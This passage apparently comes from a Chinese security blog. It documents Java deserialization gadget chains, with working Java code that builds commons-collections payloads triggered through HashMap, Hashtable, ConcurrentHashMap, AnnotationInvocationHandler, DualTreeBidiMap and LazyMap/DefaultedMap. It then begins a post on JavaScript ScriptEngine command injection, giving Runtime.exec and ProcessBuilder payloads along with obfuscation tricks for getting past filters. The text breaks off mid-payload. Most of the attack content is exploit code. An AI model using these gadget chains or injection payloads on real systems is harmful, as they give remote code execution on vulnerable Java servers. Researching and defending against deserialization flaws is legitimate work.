alt="image-20240905130147076"></p><p>comparator可控，k可控，也就是改成cc4，TransformingComparator或者cb</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt;hashmap2compare(Comparator o1, Object o2) <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(o1);<br>    treeMap1.put(o2, <span class="hljs-number">1</span>);<br>    <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(o1);<br>    treeMap2.put(o2,<span class="hljs-number">1</span>);<br>    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, treeMap1, <span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, treeMap2, <span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hashtable-触发compare"><a href="#Hashtable-触发compare" class="headerlink" title="Hashtable 触发compare"></a>Hashtable 触发compare</h3><p>不多说，hashmap可以，那么其他map也行，上科技。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable&lt;Object, Object&gt;table2compare(Comparator o1, Object o2) <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(o1);<br>    treeMap1.put(o2, <span class="hljs-number">1</span>);<br>    <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(o1);<br>    treeMap2.put(o2,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>    utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    nodeC = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, treeMap1, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, treeMap2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ConcurrentHashMap触发compare"><a href="#ConcurrentHashMap触发compare" class="headerlink" title="ConcurrentHashMap触发compare"></a>ConcurrentHashMap触发compare</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;Object, Object&gt; <span class="hljs-title function_">ConcurrentMap2cpmpare</span><span class="hljs-params">(Comparator o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(o1);<br>    treeMap1.put(o2, <span class="hljs-number">1</span>);<br>    <span class="hljs-type">TreeMap</span> <span class="hljs-variable">treeMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(o1);<br>    treeMap2.put(o2,<span class="hljs-number">1</span>);<br>    ConcurrentHashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;sizeCtl&quot;</span>, <span class="hljs-number">2</span>);<br>    Class&lt;?&gt; nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>    &#125;<br>    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, treeMap1, <span class="hljs-string">&quot;unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>    Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, treeMap2, <span class="hljs-string">&quot;springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler触发compare-（jdk"><a href="#AnnotationInvocationHandler触发compare-（jdk" class="headerlink" title="AnnotationInvocationHandler触发compare （jdk&lt;8u20）"></a>AnnotationInvocationHandler触发compare （jdk&lt;8u20）</h3><p>没什么好说的，动态代理结合treemap触发compare</p><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject</p><p><img src="image-20240905173552181.png" alt="image-20240905173552181"></p><p><img src="image-20240905173649205.png" alt="image-20240905173649205"></p><p><img src="image-20240905173723374.png" alt="image-20240905173723374"></p><p>值得注意的是，memberValues 是map的key是string类型，也就是无法用来触发cb</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">annotationhander2compare</span><span class="hljs-params">(Map o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    Constructor&lt;?&gt; Anotationdeclared =<br>            AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>    Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, o);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span>Anotationdeclared.newInstance(Override.class, Mapproxy);<br>    <span class="hljs-keyword">return</span> o1;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应cc4的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> org.apache.commons.collections4.FunctorException: InstantiateTransformer: Constructor threw an exception<br>at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:<span class="hljs-number">124</span>)<br>at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:<span class="hljs-number">32</span>)<br>at org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:<span class="hljs-number">112</span>)<br>at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:<span class="hljs-number">81</span>)<br>at java.util.TreeMap.getEntryUsingComparator(TreeMap.java:<span class="hljs-number">376</span>)<br>at java.util.TreeMap.getEntry(TreeMap.java:<span class="hljs-number">345</span>)<br>at java.util.TreeMap.get(TreeMap.java:<span class="hljs-number">278</span>)<br>at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:<span class="hljs-number">77</span>)<br>at com.sun.proxy.$Proxy1.entrySet(Unknown Source)<br>at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:<span class="hljs-number">444</span>)<br></code></pre></td></tr></table></figure><h3 id="DualTreeBidiMapr触发compare"><a href="#DualTreeBidiMapr触发compare" class="headerlink" title="DualTreeBidiMapr触发compare"></a>DualTreeBidiMapr触发compare</h3><p>org.apache.commons.collections.bidimap.DualTreeBidiMap#readObject</p><p><img src="image-20240905183839682-5532720.png" alt="image-20240905183839682"></p><p>对treep赋值</p><p><img src="image-20240905183859006.png" alt="image-20240905183859006"></p><p>父类的map是一个map数组。</p><p><img src="image-20240905183952771.png" alt="image-20240905183952771"></p><p>然后它会map中所有的键值对，然后得到一个迭代器，进行遍历put进treemap。 </p><p><img src="image-20240905184708205.png" alt="image-20240905184708205"></p><p>然后进行compare，后面没什么好说的，用cb时，把这个key，vaule 改成对应要触发getter的对象就行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DualTreeBidiMap <span class="hljs-title function_">dualTreeBidiMap2compare</span><span class="hljs-params">(Comparator o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DualTreeBidiMap</span> <span class="hljs-variable">dualTreeBidiMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DualTreeBidiMap</span>();<br>    Map[] mapArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>[<span class="hljs-number">1</span>];<br>    mapArray[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-comment">// 兼容cb，否则可能报错</span><br>    mapArray[<span class="hljs-number">0</span>].put(o2, o2);<br>    utils.setFieldValue(dualTreeBidiMap, <span class="hljs-string">&quot;comparator&quot;</span>, o1);<br>    utils.setFieldValue(dualTreeBidiMap, <span class="hljs-string">&quot;maps&quot;</span>, mapArray);<br>    <span class="hljs-keyword">return</span> dualTreeBidiMap;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-commons-collections-InstantiateTransformer"><a href="#0x03-commons-collections-InstantiateTransformer" class="headerlink" title="0x03 commons.collections (InstantiateTransformer)"></a>0x03 commons.collections (InstantiateTransformer)</h2><p>org.apache.commons.collections.functors.InstantiateTransformer#transform</p><p><img src="image-20240823155348825.png" alt="image-20240823155348825"></p><p>鸡肋，只能进行构造函数的实例化。</p><p>目前公开也就TrAXFilter.TrAXFilter()</p><p><img src="image-20240823160442171.png" alt="image-20240823160442171"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">InstantiateTransformer<span class="hljs-selector-class">.transform</span>()<br>TrAXFilter<span class="hljs-selector-class">.TrAXFilter</span>()<br>    TemplatesImpl<span class="hljs-selector-class">.newTransformer</span>()<br></code></pre></td></tr></table></figure><h3 id="map-get-触发InstantiateTransformer"><a href="#map-get-触发InstantiateTransformer" class="headerlink" title="map.get 触发InstantiateTransformer"></a>map.get 触发InstantiateTransformer</h3><p>所以我们只要把前面map.get 触发value.transform改成InstantiateTransformer就完事了</p><h2 id="0x04-commons-collections-InvokerTransformer"><a href="#0x04-commons-collections-InvokerTransformer" class="headerlink" title="0x04  commons.collections (InvokerTransformer)"></a>0x04  commons.collections (InvokerTransformer)</h2><p>没什么好说的，配合ConstantTransformer，ChainedTransformer可以调用任意类任意方法。</p><h2 id="0x05-AnnotationInvocationHandle结合TransformedMap触发Transforme"><a href="#0x05-AnnotationInvocationHandle结合TransformedMap触发Transforme" class="headerlink" title="0x05 AnnotationInvocationHandle结合TransformedMap触发Transforme"></a>0x05 AnnotationInvocationHandle结合TransformedMap触发Transforme</h2><p>可惜setValue里面不可控，组装起来不怎么顺畅。(不能直接InstantiateTransformer，InvokerTransformer)</p><p><img src="image-20240823165115069.png" alt="image-20240823165115069"></p><p>TransformedMap父类AbstractInputCheckedMapDecorator.MapEntry#setValue&#x2F;EntrySet</p><p><img src="image-20240823164127407.png" alt="image-20240823164127407"></p><p><img src="image-20240823164138048.png" alt="image-20240823164138048"></p><p>对parent完成赋值</p><p><img src="image-20240823163721352.png" alt="image-20240823163721352"></p><p><img src="image-20240823163741815.png" alt="image-20240823163741815"></p><p>最后完成触发。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>​主要就是找到相应的出发点，然后找新的出发点。然后可以结合<strong>ChainedTransformer调用InvokerTransformer</strong> 访问任意类任意方法 或者 <strong>InstantiateTransformer结合TrAXFilter</strong>调用<strong>templateimpl</strong>。</p><h2 id="0x07-补充lazymap-DefaultedMap-get"><a href="#0x07-补充lazymap-DefaultedMap-get" class="headerlink" title="0x07 补充lazymap&#x2F;DefaultedMap.get"></a>0x07 补充lazymap&#x2F;DefaultedMap.get</h2><pre><code class="hljs"> 由于org.apache.commons.collections.map.LazyMap#get/org.apache.commons.collections.map.DefaultedMap#get会调用任意Transformer类的transform方法，所以我们给几条触发get的方法，</code></pre><h3 id="AnnotationInvocationHandle触发map-get-（"><a href="#AnnotationInvocationHandle触发map-get-（" class="headerlink" title="AnnotationInvocationHandle触发map.get （&lt;&#x3D;8u20）"></a>AnnotationInvocationHandle触发map.get （&lt;&#x3D;8u20）</h3><p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p><p><img src="image-20240823171628559.png" alt="image-20240823171628559"></p><p>memberValues可控，map类型. 可以触发.但是由于memberValues限制了private final Map&lt;String, Object&gt; memberValues;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; AnnotationInvocationHandler = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; Anotationdeclared =<br>        AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);<br>Anotationdeclared.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) Anotationdeclared.newInstance(Override.class, memberValues);<br><span class="hljs-type">Map</span> <span class="hljs-variable">Mapproxy</span> <span class="hljs-operator">=</span>(Map) Proxy.newProxyInstance(Anotationdeclared.getClass().getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span>Anotationdeclared.newInstance(Override.class, Mapproxy);<br></code></pre></td></tr></table></figure><h3 id="java-util-AbstractMap-equals触发lazymap-DefaultedMap-get-（m只能为map类型）"><a href="#java-util-AbstractMap-equals触发lazymap-DefaultedMap-get-（m只能为map类型）" class="headerlink" title="java.util.AbstractMap#equals触发lazymap&#x2F;DefaultedMap.get （m只能为map类型）"></a>java.util.AbstractMap#equals触发lazymap&#x2F;DefaultedMap.get （m只能为map类型）</h3><p>java.util.AbstractMap#equals</p><p><img src="image-20241028112815265.png" alt="image-20241028112815265"></p><p>他是个抽象类。</p><p>也就是这里我们可以直接改为lazymap&#x2F;DefaultedMap, 然后他们进而触发Transformer.transform完成链式调用。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">ge<span class="hljs-variable">t:185</span>, DefaultedMap (org.apache.commons.collections.<span class="hljs-keyword">map</span>)<br>equal<span class="hljs-variable">s:495</span>, AbstractMap (java.util)<br>equal<span class="hljs-variable">s:130</span>, AbstractMapDecorator (org.apache.commons.collections.<span class="hljs-keyword">map</span>)<br>reconstitutionPu<span class="hljs-variable">t:1262</span>, Hashtable (java.util)<br>readObjec<span class="hljs-variable">t:1218</span>, Hashtable (java.util)<br></code></pre></td></tr></table></figure><p>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> DefaultedMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), chain);<br><span class="hljs-type">Map</span> <span class="hljs-variable">decorate2</span> <span class="hljs-operator">=</span> DefaultedMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), chain);<br>decorate.put(<span class="hljs-string">&quot;zZ&quot;</span>,<span class="hljs-number">1</span>);<br>decorate2.put(<span class="hljs-string">&quot;yy&quot;</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>Class&lt;?&gt; nodeE;<br>nodeE = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>Constructor&lt;?&gt; nodeEons = nodeE.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeE);<br>nodeEons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeE, <span class="hljs-number">2</span>);<br>Array.set(tbl, <span class="hljs-number">0</span>, nodeEons.newInstance(<span class="hljs-number">0</span>, decorate, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>Array.set(tbl, <span class="hljs-number">1</span>, nodeEons.newInstance(<span class="hljs-number">0</span>, decorate2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">get:<span class="hljs-number">185</span>, LazyMap (org.apache.commons.collections.map)<br>equals:<span class="hljs-number">495</span>, AbstractMap (java.util)<br>equals:<span class="hljs-number">130</span>, AbstractMapDecorator (org.apache.commons.collections.map)<br>reconstitutionPut:<span class="hljs-number">1262</span>, Hashtable (java.util)<br>readObject:<span class="hljs-number">1218</span>, Hashtable (java.util)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate( <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), chain);<br>lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate( <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), chain);<br>lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>utils.setFieldValue(hashtable,<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">2</span>);<br>Class&lt;?&gt; nodeE;<br>nodeE = Class.forName(<span class="hljs-string">&quot;java.util.Hashtable$Entry&quot;</span>);<br><br>Constructor&lt;?&gt; nodeEons = nodeE.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeE);<br>nodeEons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeE, <span class="hljs-number">2</span>);<br>Array.set(tbl, <span class="hljs-number">0</span>, nodeEons.newInstance(<span class="hljs-number">0</span>, lazyMap1, <span class="hljs-string">&quot;Unam4&quot;</span>, <span class="hljs-literal">null</span>));<br>Array.set(tbl, <span class="hljs-number">1</span>, nodeEons.newInstance(<span class="hljs-number">0</span>, lazyMap2, <span class="hljs-string">&quot;Springkill&quot;</span>, <span class="hljs-literal">null</span>));<br>utils.setFieldValue(hashtable, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br></code></pre></td></tr></table></figure><p>也就是hashmap、hashtable、HotSwappableTargetSource、ConcurrentHashMap 等都行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java中js命令执行与绕过</title>
    <link href="/2024/08/15/java%E4%B8%ADjs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <url>/2024/08/15/java%E4%B8%ADjs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞原因"><a href="#0x01-漏洞原因" class="headerlink" title="0x01 漏洞原因"></a>0x01 漏洞原因</h3><p>​java中<code>javax.script.ScriptEngine</code> 类来解析js并执行js代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(test);<br></code></pre></td></tr></table></figure><p>因为scriptEngine的相关特性，可以执行java代码，所以当我们把test替换为如下代码，就可以命令执行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;</span>open -a calculator<span class="hljs-string">&quot;)&#125;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x02-基本payload"><a href="#0x02-基本payload" class="headerlink" title="0x02  基本payload"></a>0x02  基本payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;</span>calc<span class="hljs-string">&quot;)&#125;;&quot;</span>;<br>String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=new java.lang.ProcessBuilder; x.command(\&quot;calc\&quot;); x.start();return true;&#125;;&quot;</span>;<br><span class="hljs-comment">// 套娃</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">taowa</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; new javax.script.ScriptEngineManager().getEngineByName(\&quot;js\&quot;).eval(\&quot;var a = test(); function test() &#123; var x=java.lang.\&quot;+\&quot;Runtime.getRuntime().exec(\\\&quot;open -a Calculator\\\&quot;);&#125;;\&quot;); &#125;;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x03-垃圾字符payload"><a href="#0x03-垃圾字符payload" class="headerlink" title="0x03 垃圾字符payload"></a>0x03 垃圾字符payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 拼接        </span><br>String test51=<span class="hljs-string">&quot;var JavaTest= Java.type(\&quot;java.lang\&quot;+\&quot;.Runtime\&quot;); var b =JavaTest.getRuntime(); b.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><span class="hljs-comment">// **截断</span><br>        String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang./**/Runtime.getRuntime().exec(\&quot;open -a 